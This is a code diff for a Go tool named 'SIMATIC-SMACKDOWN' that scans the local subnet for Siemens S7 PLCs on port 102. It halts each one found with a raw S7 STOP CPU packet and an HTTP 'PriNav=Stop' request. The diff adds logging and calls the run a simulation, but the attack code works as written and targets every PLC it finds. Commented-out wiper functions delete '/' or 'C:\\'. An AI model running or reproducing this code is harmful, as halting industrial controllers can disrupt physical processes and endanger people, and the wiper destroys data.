@@ -5,8 +5,6 @@ import (
 	"fmt"
 	"net"
 	"net/http"
-	"os"
-	"runtime"
 	"strings"
 	"time"
 )
@@ -15,13 +13,13 @@ import (
 func GetIPAddr() string {
 	addrs, err := net.InterfaceAddrs()
 	if err != nil {
-		fmt.Println(err)
+		fmt.Printf("[ERROR] Failed to get network interfaces: %v\n", err)
 		return ""
 	}
 
 	for _, address := range addrs {
 		if ipnet, ok := address.(*net.IPNet); ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
-			fmt.Println(ipnet.IP.String());
+			fmt.Printf("[+] Found local IP address: %s\n", ipnet.IP.String())
 			return ipnet.IP.String()
 		}
 	}
@@ -32,7 +30,7 @@ func GetIPAddr() string {
 func GetNetwork(ipAddr string) []string {
 	_, ipnet, err := net.ParseCIDR(ipAddr)
 	if err != nil {
-		fmt.Println(err)
+		fmt.Printf("[ERROR] Failed to parse CIDR: %v\n", err)
 		return nil
 	}
 
@@ -46,51 +44,63 @@ func GetNetwork(ipAddr string) []string {
 		binary.BigEndian.PutUint32(ip, i)
 		ipList = append(ipList, ip.String())
 	}
-	fmt.Println(ipList);
+	fmt.Printf("[+] Generated %d IP addresses in subnet %s\n", len(ipList), ipAddr)
 	return ipList
 }
 
 // ScanIP returns a list of reachable IPs on port 102.
 func ScanIP(ipList []string) []string {
+	fmt.Printf("[*] Starting scan for S7 PLCs on port 102...\n")
 	var scannedIPs []string
 	for _, ip := range ipList {
 		target := ip + ":102"
 		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
+			fmt.Printf("[+] Found S7 PLC at: %s\n", ip)
 			scannedIPs = append(scannedIPs, ip)
 			conn.Close()
 		}
 	}
-	fmt.Println(scannedIPs);
+	fmt.Printf("[+] Scan complete. Found %d S7 PLCs\n", len(scannedIPs))
 	return scannedIPs
 }
 
 // KillIP sends a stop command to the devices at the scanned IPs.
 func KillIP(scannedIPs []string) {
+	fmt.Printf("\n[*] Initiating S7 protocol STOP CPU attack...\n")
 	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
 	for _, ip := range scannedIPs {
 		if conn, err := net.Dial("tcp", ip+":102"); err == nil {
-			fmt.Println(ip);
+			fmt.Printf("[!] Sending STOP command to PLC at %s via S7 protocol\n", ip)
 			conn.Write([]byte(stop))
 			conn.Close()
+		} else {
+			fmt.Printf("[-] Failed to connect to %s: %v\n", ip, err)
 		}
 	}
+	fmt.Printf("[*] S7 protocol attack phase complete\n")
 }
 
 // KillHTTP sends a stop command via HTTP to the devices at the scanned IPs.
 func KillHTTP(scannedIPs []string) {
+	fmt.Printf("\n[*] Initiating HTTP web interface STOP attack...\n")
 	client := &http.Client{}
 	for _, ip := range scannedIPs {
 		data := strings.NewReader(`Run=1&PriNav=Stop`)
 		req, err := http.NewRequest("POST", "http://"+ip+"/CPUCommands", data)
 		if err != nil {
+			fmt.Printf("[-] Failed to create HTTP request for %s: %v\n", ip, err)
 			continue
 		}
-		fmt.Println(ip);
+		fmt.Printf("[!] Sending STOP command to PLC at %s via HTTP interface\n", ip)
 		setHTTPHeaders(req, ip)
-		if _, err = client.Do(req); err != nil {
-			continue
+		if resp, err := client.Do(req); err != nil {
+			fmt.Printf("[-] HTTP request failed for %s: %v\n", ip, err)
+		} else {
+			fmt.Printf("[+] HTTP request sent successfully to %s (Status: %s)\n", ip, resp.Status)
+			resp.Body.Close()
 		}
 	}
+	fmt.Printf("[*] HTTP attack phase complete\n")
 }
 
 // setHTTPHeaders sets the necessary HTTP headers for the requests in KillHTTP.
@@ -112,30 +122,55 @@ func setHTTPHeaders(req *http.Request, ip string) {
 
 // KillLinux deletes files on Linux systems if the user has sufficient privileges.
 // func KillLinux() {
+// 	fmt.Println("[!!!] DESTRUCTIVE: Attempting to wipe Linux filesystem...")
 // 	if err := os.RemoveAll("/"); err != nil {
-// 		fmt.Println(err)
+// 		fmt.Printf("[ERROR] Failed to wipe filesystem: %v\n", err)
 // 	}
 // }
 
 // KillWindows deletes files on Windows systems if the user has sufficient privileges.
 // func KillWindows() {
+// 	fmt.Println("[!!!] DESTRUCTIVE: Attempting to wipe Windows filesystem...")
 // 	if err := os.RemoveAll("C:\\"); err != nil {
-// 		fmt.Println(err)
+// 		fmt.Printf("[ERROR] Failed to wipe filesystem: %v\n", err)
 // 	}
 // }
 
 func main() {
+	fmt.Println("=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===")
+	fmt.Println("[*] Starting attack simulation on test environment...")
+
 	ipAddr := GetIPAddr() + "/24"
+	if ipAddr == "/24" {
+		fmt.Println("[ERROR] No network interface found. Exiting.")
+		return
+	}
+
+	fmt.Printf("[*] Targeting subnet: %s\n", ipAddr)
 	ipList := GetNetwork(ipAddr)
+	if ipList == nil {
+		fmt.Println("[ERROR] Failed to generate IP list. Exiting.")
+		return
+	}
+
 	scannedIPs := ScanIP(ipList)
+	if len(scannedIPs) == 0 {
+		fmt.Println("[!] No S7 PLCs found on the network. Exiting.")
+		return
+	}
 
 	KillIP(scannedIPs)
 	KillHTTP(scannedIPs)
 
 	// switch runtime.GOOS {
 	// case "linux":
-	// 	KillLinux()
+	// 	fmt.Printf("[!] Detected Linux OS - Destructive payload available but disabled\n")
+	// 	// KillLinux()
 	// case "windows":
-	// 	KillWindows()
+	// 	fmt.Printf("[!] Detected Windows OS - Destructive payload available but disabled\n")
+	// 	// KillWindows()
 	// }
+
+	fmt.Println("\n[*] Attack simulation complete.")
+	fmt.Printf("[*] Targeted %d PLCs in total\n", len(scannedIPs))
 }
